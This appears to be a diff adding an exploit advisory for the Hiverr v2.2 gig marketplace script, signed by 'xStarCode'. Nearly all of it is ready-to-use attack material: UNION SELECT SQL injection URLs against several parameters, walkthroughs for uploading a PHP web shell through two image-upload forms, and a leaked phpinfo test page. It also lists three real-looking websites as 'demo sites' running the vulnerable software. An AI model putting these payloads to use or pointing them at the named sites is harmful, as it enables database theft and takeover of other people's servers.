@@ -1,0 +1,68 @@
+# Exploit Title: Hiverr v2.2 Multiple Vulnerabilities
+# Date: 05.02.2013
+# Author: xStarCode
+# Exploit Author: xStarCode
+# Version: 2.2
+# Category: webapps
+# Google Dork: *
+# Tested on: Linux
+# Exploit:
+
+
+-----Index Vulnerabilities:
+==>
+SQL Injections
+http://localhost/gig_desc.php?No=-13+UNION+SELECT+version(),2,3,4,5,6,7,8,9,10,11--
+http://localhost/categorygigs.php?category=-0+UNION+SELECT+1,version(),3,4,5,6,7--
+http://localhost/categorygigs.php?category=&mny=-100+UNION+SELECT+version(),2,3,4,5,6,7,8,9,10,11--
+<==
+
+
+-----User Panel Vulnerabilities:
+==>
+SQL Injection
+http://localhost/inbox_detail.php?userid=31&recpid=31&gig=-15+UNION+SELECT+1,2,3,version(),5,6,7,8--
+<==
+-----Multiple Shell Upload:
+==>
+Go to http://localhost/profilesetting.php
+And upload a PHP Shell to "Profile Image"
+View source:
+<img src="profileimage/*****SHELL*****_.php" alt="image" height="100" width="100">
+Go to http://localhost/profileimage/*****SHELL*****_.php
+<==
+ next -
+==>
+Go to "Greate Gig" http://localhost/addnewgig.php
+And upload a PHP Shell to "Add Image"
+View source:
+<td width="107">
+<img src="gigimages/*****SHELL*****_.php" height="76" width="106">
+</td>
+Go to http://localhost/gigimages/*****SHELL*****_.php
+<==
+
+
+-----PHP Info Leak:
+==>
+Go to http://localhost/nitintest.php
+<==
+
+
+# Demo sites:
+http://trabajoenlinea.net/
+http://aramar.jp/
+http://www.seostinger.com/
+#
+______ Xo
+     |
+     |
+  /  |   \
+ ;_/,X_,\_;
+\._/x  x\_./
+\_./(::)\._/
+___ xStarCode
+#
+Author Mail: xstarcode@vpn.st
+Author Website: www.xstarcode.wordpress.com
+#
